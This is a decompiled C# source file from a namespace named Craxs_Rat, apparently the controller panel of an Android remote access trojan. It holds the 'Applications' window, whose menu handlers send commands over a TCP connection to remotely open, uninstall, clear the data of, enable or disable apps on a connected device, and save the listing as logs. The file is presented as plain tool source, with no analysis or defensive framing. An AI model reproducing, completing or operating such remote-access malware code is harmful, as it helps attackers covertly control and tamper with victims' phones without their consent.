using System;
using System.ComponentModel;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat
{
	// Token: 0x020000A0 RID: 160
	[DesignerGenerated]
	public partial class Applications : Form
	{
		// Token: 0x06000870 RID: 2160 RVA: 0x0003FA20 File Offset: 0x0003DC20
		public Applications()
		{
			base.Load += this.Applications_Load;
			base.Activated += this.Applications_Activated;
			base.Deactivate += this.Applications_Deactivate;
			this.string_0 = "null";
			this.bool_0 = false;
			this.InitializeComponent();
		}

		// Token: 0x17000244 RID: 580
		// (get) Token: 0x06000873 RID: 2163 RVA: 0x00005B2D File Offset: 0x00003D2D
		// (set) Token: 0x06000874 RID: 2164 RVA: 0x00040654 File Offset: 0x0003E854
		internal virtual DataGridView DGV0
		{
			[CompilerGenerated]
			get
			{
				return this._DGV0;
			}
			[CompilerGenerated]
			set
			{
				DataGridViewRowsRemovedEventHandler value2 = new DataGridViewRowsRemovedEventHandler(this.DGV0_RowsRemoved);
				DataGridViewRowsAddedEventHandler value3 = new DataGridViewRowsAddedEventHandler(this.DGV0_RowsAdded);
				EventHandler value4 = new EventHandler(this.DGV0_SelectionChanged);
				DataGridView dgv = this._DGV0;
				if (dgv != null)
				{
					dgv.RowsRemoved -= value2;
					dgv.RowsAdded -= value3;
					dgv.SelectionChanged -= value4;
				}
				this._DGV0 = value;
				dgv = this._DGV0;
				if (dgv != null)
				{
					dgv.RowsRemoved += value2;
					dgv.RowsAdded += value3;
					dgv.SelectionChanged += value4;
				}
			}
		}

		// Token: 0x17000245 RID: 581
		// (get) Token: 0x06000875 RID: 2165 RVA: 0x00005B35 File Offset: 0x00003D35
		// (set) Token: 0x06000876 RID: 2166 RVA: 0x000406D0 File Offset: 0x0003E8D0
		internal virtual ContextMenuStrip ctx { get; set; }

		// Token: 0x17000246 RID: 582
		// (get) Token: 0x06000877 RID: 2167 RVA: 0x00005B3D File Offset: 0x00003D3D
		// (set) Token: 0x06000878 RID: 2168 RVA: 0x000406E4 File Offset: 0x0003E8E4
		internal virtual ToolStripMenuItem OpenToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._OpenToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.OpenToolStripMenuItem_Click);
				ToolStripMenuItem openToolStripMenuItem = this._OpenToolStripMenuItem;
				if (openToolStripMenuItem != null)
				{
					openToolStripMenuItem.Click -= value2;
				}
				this._OpenToolStripMenuItem = value;
				openToolStripMenuItem = this._OpenToolStripMenuItem;
				if (openToolStripMenuItem != null)
				{
					openToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000247 RID: 583
		// (get) Token: 0x06000879 RID: 2169 RVA: 0x00005B45 File Offset: 0x00003D45
		// (set) Token: 0x0600087A RID: 2170 RVA: 0x00040728 File Offset: 0x0003E928
		internal virtual ToolStripMenuItem SaveToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._SaveToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.SaveToolStripMenuItem_Click);
				ToolStripMenuItem saveToolStripMenuItem = this._SaveToolStripMenuItem;
				if (saveToolStripMenuItem != null)
				{
					saveToolStripMenuItem.Click -= value2;
				}
				this._SaveToolStripMenuItem = value;
				saveToolStripMenuItem = this._SaveToolStripMenuItem;
				if (saveToolStripMenuItem != null)
				{
					saveToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000248 RID: 584
		// (get) Token: 0x0600087B RID: 2171 RVA: 0x00005B4D File Offset: 0x00003D4D
		// (set) Token: 0x0600087C RID: 2172 RVA: 0x0004076C File Offset: 0x0003E96C
		internal virtual ToolStripMenuItem SaveAsToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._SaveAsToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.SaveAsToolStripMenuItem_Click);
				ToolStripMenuItem saveAsToolStripMenuItem = this._SaveAsToolStripMenuItem;
				if (saveAsToolStripMenuItem != null)
				{
					saveAsToolStripMenuItem.Click -= value2;
				}
				this._SaveAsToolStripMenuItem = value;
				saveAsToolStripMenuItem = this._SaveAsToolStripMenuItem;
				if (saveAsToolStripMenuItem != null)
				{
					saveAsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000255 RID: 597
		// (get) Token: 0x0600087D RID: 2173 RVA: 0x00005B55 File Offset: 0x00003D55
		// (set) Token: 0x0600087E RID: 2174 RVA: 0x000407B0 File Offset: 0x0003E9B0
		internal virtual System.Windows.Forms.Timer TOpacity
		{
			[CompilerGenerated]
			get
			{
				return this._TOpacity;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.TOpacity_Tick);
				System.Windows.Forms.Timer topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick -= value2;
				}
				this._TOpacity = value;
				topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick += value2;
				}
			}
		}

		// Token: 0x17000249 RID: 585
		// (get) Token: 0x0600087F RID: 2175 RVA: 0x00005B5D File Offset: 0x00003D5D
		// (set) Token: 0x06000880 RID: 2176 RVA: 0x000407F4 File Offset: 0x0003E9F4
		internal virtual ProgressBar PB { get; set; }

		// Token: 0x1700024A RID: 586
		// (get) Token: 0x06000881 RID: 2177 RVA: 0x00005B65 File Offset: 0x00003D65
		// (set) Token: 0x06000882 RID: 2178 RVA: 0x00040808 File Offset: 0x0003EA08
		internal virtual PictureBox BoxTitle
		{
			[CompilerGenerated]
			get
			{
				return this._BoxTitle;
			}
			[CompilerGenerated]
			set
			{
				PaintEventHandler value2 = new PaintEventHandler(this.BoxTitle_Paint);
				EventHandler value3 = new EventHandler(this.BoxTitle_Resize);
				PictureBox boxTitle = this._BoxTitle;
				if (boxTitle != null)
				{
					boxTitle.Paint -= value2;
					boxTitle.Resize -= value3;
				}
				this._BoxTitle = value;
				boxTitle = this._BoxTitle;
				if (boxTitle != null)
				{
					boxTitle.Paint += value2;
					boxTitle.Resize += value3;
				}
			}
		}

		// Token: 0x1700024B RID: 587
		// (get) Token: 0x06000883 RID: 2179 RVA: 0x00005B6D File Offset: 0x00003D6D
		// (set) Token: 0x06000884 RID: 2180 RVA: 0x00040868 File Offset: 0x0003EA68
		internal virtual ToolStripMenuItem PropertiesToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._PropertiesToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.PropertiesToolStripMenuItem_Click);
				ToolStripMenuItem propertiesToolStripMenuItem = this._PropertiesToolStripMenuItem;
				if (propertiesToolStripMenuItem != null)
				{
					propertiesToolStripMenuItem.Click -= value2;
				}
				this._PropertiesToolStripMenuItem = value;
				propertiesToolStripMenuItem = this._PropertiesToolStripMenuItem;
				if (propertiesToolStripMenuItem != null)
				{
					propertiesToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700024C RID: 588
		// (get) Token: 0x06000885 RID: 2181 RVA: 0x00005B75 File Offset: 0x00003D75
		// (set) Token: 0x06000886 RID: 2182 RVA: 0x000408AC File Offset: 0x0003EAAC
		internal virtual ToolStripMenuItem RefreshToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._RefreshToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.RefreshToolStripMenuItem_Click);
				ToolStripMenuItem refreshToolStripMenuItem = this._RefreshToolStripMenuItem;
				if (refreshToolStripMenuItem != null)
				{
					refreshToolStripMenuItem.Click -= value2;
				}
				this._RefreshToolStripMenuItem = value;
				refreshToolStripMenuItem = this._RefreshToolStripMenuItem;
				if (refreshToolStripMenuItem != null)
				{
					refreshToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700024D RID: 589
		// (get) Token: 0x06000887 RID: 2183 RVA: 0x00005B7D File Offset: 0x00003D7D
		// (set) Token: 0x06000888 RID: 2184 RVA: 0x000408F0 File Offset: 0x0003EAF0
		internal virtual DataGridViewTextBoxColumn Column1 { get; set; }

		// Token: 0x1700024E RID: 590
		// (get) Token: 0x06000889 RID: 2185 RVA: 0x00005B85 File Offset: 0x00003D85
		// (set) Token: 0x0600088A RID: 2186 RVA: 0x00040904 File Offset: 0x0003EB04
		internal virtual DataGridViewTextBoxColumn Column6 { get; set; }

		// Token: 0x1700024F RID: 591
		// (get) Token: 0x0600088B RID: 2187 RVA: 0x00005B8D File Offset: 0x00003D8D
		// (set) Token: 0x0600088C RID: 2188 RVA: 0x00040918 File Offset: 0x0003EB18
		internal virtual DataGridViewTextBoxColumn Column9 { get; set; }

		// Token: 0x17000250 RID: 592
		// (get) Token: 0x0600088D RID: 2189 RVA: 0x00005B95 File Offset: 0x00003D95
		// (set) Token: 0x0600088E RID: 2190 RVA: 0x0004092C File Offset: 0x0003EB2C
		internal virtual DataGridViewTextBoxColumn Column2 { get; set; }

		// Token: 0x17000251 RID: 593
		// (get) Token: 0x0600088F RID: 2191 RVA: 0x00005B9D File Offset: 0x00003D9D
		// (set) Token: 0x06000890 RID: 2192 RVA: 0x00040940 File Offset: 0x0003EB40
		internal virtual DataGridViewImageColumn Column3 { get; set; }

		// Token: 0x17000252 RID: 594
		// (get) Token: 0x06000891 RID: 2193 RVA: 0x00005BA5 File Offset: 0x00003DA5
		// (set) Token: 0x06000892 RID: 2194 RVA: 0x00040954 File Offset: 0x0003EB54
		internal virtual ToolStripMenuItem UninstallToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._UninstallToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.UninstallToolStripMenuItem_Click);
				ToolStripMenuItem uninstallToolStripMenuItem = this._UninstallToolStripMenuItem;
				if (uninstallToolStripMenuItem != null)
				{
					uninstallToolStripMenuItem.Click -= value2;
				}
				this._UninstallToolStripMenuItem = value;
				uninstallToolStripMenuItem = this._UninstallToolStripMenuItem;
				if (uninstallToolStripMenuItem != null)
				{
					uninstallToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000253 RID: 595
		// (get) Token: 0x06000893 RID: 2195 RVA: 0x00005BAD File Offset: 0x00003DAD
		// (set) Token: 0x06000894 RID: 2196 RVA: 0x00040998 File Offset: 0x0003EB98
		internal virtual ToolStripMenuItem ClearAppDataToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._ClearAppDataToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.ClearAppDataToolStripMenuItem_Click);
				ToolStripMenuItem clearAppDataToolStripMenuItem = this._ClearAppDataToolStripMenuItem;
				if (clearAppDataToolStripMenuItem != null)
				{
					clearAppDataToolStripMenuItem.Click -= value2;
				}
				this._ClearAppDataToolStripMenuItem = value;
				clearAppDataToolStripMenuItem = this._ClearAppDataToolStripMenuItem;
				if (clearAppDataToolStripMenuItem != null)
				{
					clearAppDataToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000254 RID: 596
		// (get) Token: 0x06000895 RID: 2197 RVA: 0x00005BB5 File Offset: 0x00003DB5
		// (set) Token: 0x06000896 RID: 2198 RVA: 0x000409DC File Offset: 0x0003EBDC
		internal virtual ToolStripMenuItem EnableToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._EnableToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.EnableToolStripMenuItem_Click);
				ToolStripMenuItem enableToolStripMenuItem = this._EnableToolStripMenuItem;
				if (enableToolStripMenuItem != null)
				{
					enableToolStripMenuItem.Click -= value2;
				}
				this._EnableToolStripMenuItem = value;
				enableToolStripMenuItem = this._EnableToolStripMenuItem;
				if (enableToolStripMenuItem != null)
				{
					enableToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x06000897 RID: 2199 RVA: 0x00040A20 File Offset: 0x0003EC20
		public void method_0()
		{
			string left = Module4.smethod_1();
			if (Operators.CompareString(left, "AR", false) == 0)
			{
				this.ctx.Items[0].Text = "فتح";
				this.ctx.Items[1].Text = "تحديث";
				this.ctx.Items[2].Text = "خصائص";
				this.ctx.Items[3].Text = "حفظ";
				this.ctx.Items[4].Text = "حفظ كـ";
				this.ctx.Items[5].Text = "إلغاء التثبيت";
				this.ctx.Items[6].Text = "تعطيل";
				this.ctx.Items[7].Text = "تفعيل";
			}
			else if (Operators.CompareString(left, "CN", false) == 0)
			{
				this.ctx.Items[0].Text = "打开";
				this.ctx.Items[1].Text = "刷新";
				this.ctx.Items[2].Text = "特性";
				this.ctx.Items[3].Text = "节省";
				this.ctx.Items[4].Text = "另存为";
				this.ctx.Items[5].Text = "卸载";
				this.ctx.Items[6].Text = "禁用";
				this.ctx.Items[7].Text = "使能够";
			}
		}

		// Token: 0x06000898 RID: 2200 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_1()
		{
		}

		// Token: 0x06000899 RID: 2201 RVA: 0x00040C0C File Offset: 0x0003EE0C
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
			}
			else
			{
				this.TOpacity.Enabled = false;
			}
		}

		// Token: 0x0600089A RID: 2202 RVA: 0x00040C54 File Offset: 0x0003EE54
		private void Applications_Load(object sender, EventArgs e)
		{
			base.Icon = new Icon(Module8.string_1 + "\\Icons\\win\\2.ico");
			this.method_1();
			this.DGV0.ColumnHeadersDefaultCellStyle.Font = Module8.font_1;
			this.DGV0.DefaultCellStyle.Font = Module8.font_1;
			this.ctx.Renderer = new GClass12();
			if (Operators.CompareString(Module5.Saving_data, "No", false) == 0)
			{
				this.SaveToolStripMenuItem.Visible = true;
				this.SaveAsToolStripMenuItem.Visible = true;
			}
			this.Text = this.string_0;
			this.TOpacity.Interval = Module5.int_0;
			this.TOpacity.Enabled = true;
			this.bool_0 = true;
		}

		// Token: 0x0600089B RID: 2203 RVA: 0x00040D18 File Offset: 0x0003EF18
		private void OpenToolStripMenuItem_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.DGV0.SelectedRows.Count > 0)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[2].Value);
						if (this.gclass8_0 != null)
						{
							object[] objects_ = new object[]
							{
								this.tcpClient_0,
								string.Concat(new string[]
								{
									Module13.string_28,
									GClass9.string_0,
									Module8.string_4,
									".apps",
									GClass9.string_0,
									"method",
									GClass9.string_0,
									Module13.string_40,
									GClass9.string_0,
									"open",
									GClass9.string_1,
									text
								}),
								Module2.smethod_9().GetBytes("null"),
								this.gclass8_0
							};
							this.gclass8_0.method_2(objects_);
						}
					}
				}
			}
		}

		// Token: 0x0600089C RID: 2204 RVA: 0x00040E54 File Offset: 0x0003F054
		private void PropertiesToolStripMenuItem_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.DGV0.SelectedRows.Count > 0)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[2].Value);
						if (this.gclass8_0 != null)
						{
							object[] objects_ = new object[]
							{
								this.tcpClient_0,
								string.Concat(new string[]
								{
									Module13.string_28,
									GClass9.string_0,
									Module8.string_4,
									".apps",
									GClass9.string_0,
									"method",
									GClass9.string_0,
									Module13.string_25,
									GClass9.string_0,
									"properties",
									GClass9.string_1,
									text
								}),
								Module2.smethod_9().GetBytes("null"),
								this.gclass8_0
							};
							this.gclass8_0.method_2(objects_);
						}
					}
				}
			}
		}

		// Token: 0x0600089D RID: 2205 RVA: 0x00040F90 File Offset: 0x0003F190
		private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
			saveFileDialog.Filter = "html (*.html)|*.html";
			if (saveFileDialog.ShowDialog() == DialogResult.OK)
			{
				ThreadPool.QueueUserWorkItem((Applications.Class11.waitCallback_0 == null) ? (Applications.Class11.waitCallback_0 = new WaitCallback(Applications.Class11.class11_0.method_0)) : Applications.Class11.waitCallback_0, new object[]
				{
					this.DGV0,
					"null",
					saveFileDialog.FileName,
					this.object_1,
					this.string_1 + " - " + this.string_2,
					"Applications",
					"log",
					"null"
				});
			}
			saveFileDialog.Dispose();
		}

		// Token: 0x0600089E RID: 2206 RVA: 0x00041068 File Offset: 0x0003F268
		private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Module8.smethod_5(this.gclass8_0);
			ThreadPool.QueueUserWorkItem((Applications.Class11.waitCallback_1 != null) ? Applications.Class11.waitCallback_1 : (Applications.Class11.waitCallback_1 = new WaitCallback(Applications.Class11.class11_0.method_1)), new object[]
			{
				this.DGV0,
				this.object_0,
				"Applications",
				this.object_1,
				this.string_1 + " - " + this.string_2,
				"Applications",
				"log",
				DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
			});
		}

		// Token: 0x0600089F RID: 2207 RVA: 0x0004111C File Offset: 0x0003F31C
		private void BoxTitle_Paint(object sender, PaintEventArgs e)
		{
			checked
			{
				if (this.bool_0)
				{
					int count = this.DGV0.Rows.Count;
					string str = "All " + Conversions.ToString(count);
					string str2 = "Selected " + Conversions.ToString(this.DGV0.SelectedRows.Count);
					Color white = Module5.White;
					e.Graphics.DrawLine(new Pen(Color.FromArgb(50, (int)white.R, (int)white.G, (int)white.B)), 0, 1, this.BoxTitle.Width, 1);
					Brush brush = new SolidBrush(Module5.White);
					Brush brush2 = new SolidBrush(Color.FromArgb(170, (int)this.BoxTitle.BackColor.R, (int)this.BoxTitle.BackColor.G, (int)this.BoxTitle.BackColor.B));
					Size size = TextRenderer.MeasureText(str + Strings.Space(10) + str2, Module8.font_1);
					Rectangle rect = new Rectangle(0, 2, this.BoxTitle.Width, size.Height + 5);
					e.Graphics.FillRectangle(new Pen(brush2).Brush, rect);
					e.Graphics.DrawString(str + Strings.Space(10) + str2 + Strings.Space(10), Module8.font_1, brush, 0f, 2f);
					Size size2 = TextRenderer.MeasureText("S", Module8.font_1);
					if (this.BoxTitle.Height != size2.Height + 3)
					{
						this.BoxTitle.Height = size2.Height + 3;
					}
				}
			}
		}

		// Token: 0x060008A0 RID: 2208 RVA: 0x000412D0 File Offset: 0x0003F4D0
		private void Applications_Activated(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x060008A1 RID: 2209 RVA: 0x000412D0 File Offset: 0x0003F4D0
		private void Applications_Deactivate(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x060008A2 RID: 2210 RVA: 0x000412D0 File Offset: 0x0003F4D0
		private void BoxTitle_Resize(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x060008A3 RID: 2211 RVA: 0x000412E8 File Offset: 0x0003F4E8
		private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				object[] objects_ = new object[]
				{
					this.tcpClient_0,
					string.Concat(new string[]
					{
						Module13.string_28,
						GClass9.string_0,
						Module8.string_4,
						".apps",
						GClass9.string_0,
						"method",
						GClass9.string_0,
						Module13.string_18,
						GClass9.string_0,
						"load",
						GClass9.string_1,
						"y"
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
			}
		}

		// Token: 0x060008A4 RID: 2212 RVA: 0x000413AC File Offset: 0x0003F5AC
		private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.DGV0.SelectedRows.Count > 0)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[2].Value);
						if (this.gclass8_0 != null)
						{
							TcpClient tcpClient = this.gclass8_0.tcpClient_0;
							string[] array = this.gclass8_0.string_0.Split(new char[]
							{
								':'
							});
							object[] objects_ = new object[]
							{
								tcpClient,
								string.Concat(new string[]
								{
									Module13.string_29,
									GClass9.string_0,
									"SFD<*>",
									text,
									GClass9.string_0,
									array[0],
									GClass9.string_0,
									array[1],
									GClass9.string_0,
									Module13.string_5,
									GClass9.string_0,
									Conversions.ToString(0),
									GClass9.string_0,
									Conversions.ToString(0),
									GClass9.string_0,
									GClass9.string_3,
									GClass9.string_0,
									this.gclass8_0.string_2
								}),
								Module2.smethod_9().GetBytes("null"),
								this.gclass8_0
							};
							this.gclass8_0.method_2(objects_);
						}
					}
				}
			}
		}

		// Token: 0x060008A5 RID: 2213 RVA: 0x00041548 File Offset: 0x0003F748
		private void ClearAppDataToolStripMenuItem_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.DGV0.SelectedRows.Count > 0)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[2].Value);
						if (this.gclass8_0 != null)
						{
							TcpClient tcpClient = this.gclass8_0.tcpClient_0;
							string[] array = this.gclass8_0.string_0.Split(new char[]
							{
								':'
							});
							object[] objects_ = new object[]
							{
								tcpClient,
								string.Concat(new string[]
								{
									Module13.string_29,
									GClass9.string_0,
									"CRD<*>E>",
									text,
									GClass9.string_0,
									array[0],
									GClass9.string_0,
									array[1],
									GClass9.string_0,
									Module13.string_5,
									GClass9.string_0,
									Conversions.ToString(0),
									GClass9.string_0,
									Conversions.ToString(0),
									GClass9.string_0,
									GClass9.string_3,
									GClass9.string_0,
									this.gclass8_0.string_2
								}),
								Module2.smethod_9().GetBytes("null"),
								this.gclass8_0
							};
							this.gclass8_0.method_2(objects_);
						}
					}
				}
			}
		}

		// Token: 0x060008A6 RID: 2214 RVA: 0x000416E4 File Offset: 0x0003F8E4
		private void EnableToolStripMenuItem_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.DGV0.SelectedRows.Count > 0)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[2].Value);
						if (this.gclass8_0 != null)
						{
							TcpClient tcpClient = this.gclass8_0.tcpClient_0;
							string[] array = this.gclass8_0.string_0.Split(new char[]
							{
								':'
							});
							object[] objects_ = new object[]
							{
								tcpClient,
								string.Concat(new string[]
								{
									Module13.string_29,
									GClass9.string_0,
									"CRD<*>D>",
									text,
									GClass9.string_0,
									array[0],
									GClass9.string_0,
									array[1],
									GClass9.string_0,
									Module13.string_5,
									GClass9.string_0,
									Conversions.ToString(0),
									GClass9.string_0,
									Conversions.ToString(0),
									GClass9.string_0,
									GClass9.string_3,
									GClass9.string_0,
									this.gclass8_0.string_2
								}),
								Module2.smethod_9().GetBytes("null"),
								this.gclass8_0
							};
							this.gclass8_0.method_2(objects_);
						}
					}
				}
			}
		}

		// Token: 0x060008A7 RID: 2215 RVA: 0x000412D0 File Offset: 0x0003F4D0
		private void DGV0_RowsRemoved(object sender, DataGridViewRowsRemovedEventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x060008A8 RID: 2216 RVA: 0x000412D0 File Offset: 0x0003F4D0
		private void DGV0_RowsAdded(object sender, DataGridViewRowsAddedEventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x060008A9 RID: 2217 RVA: 0x000412D0 File Offset: 0x0003F4D0
		private void DGV0_SelectionChanged(object sender, EventArgs e)
		{
			this.BoxTitle.Invalidate();
		}

		// Token: 0x04000480 RID: 1152
		public TcpClient tcpClient_0;

		// Token: 0x04000481 RID: 1153
		public GClass8 gclass8_0;

		// Token: 0x04000482 RID: 1154
		public string string_0;

		// Token: 0x04000483 RID: 1155
		public string object_0;

		// Token: 0x04000484 RID: 1156
		public string object_1;

		// Token: 0x04000485 RID: 1157
		public string string_1;

		// Token: 0x04000486 RID: 1158
		public string string_2;

		// Token: 0x04000487 RID: 1159
		private bool bool_0;

		// Token: 0x020000A1 RID: 161
		[CompilerGenerated]
		[Serializable]
		internal sealed class Class11
		{
			// Token: 0x060008AC RID: 2220 RVA: 0x00021A70 File Offset: 0x0001FC70
			internal void method_0(object _object_0)
			{
				Module8.smethod_13((Array)_object_0);
			}

			// Token: 0x060008AD RID: 2221 RVA: 0x00021A70 File Offset: 0x0001FC70
			internal void method_1(object _object_1)
			{
				Module8.smethod_13((Array)_object_1);
			}

			// Token: 0x04000488 RID: 1160
			public static readonly Applications.Class11 class11_0 = new Applications.Class11();

			// Token: 0x04000489 RID: 1161
			public static WaitCallback waitCallback_0;

			// Token: 0x0400048A RID: 1162
			public static WaitCallback waitCallback_1;
		}
	}
}
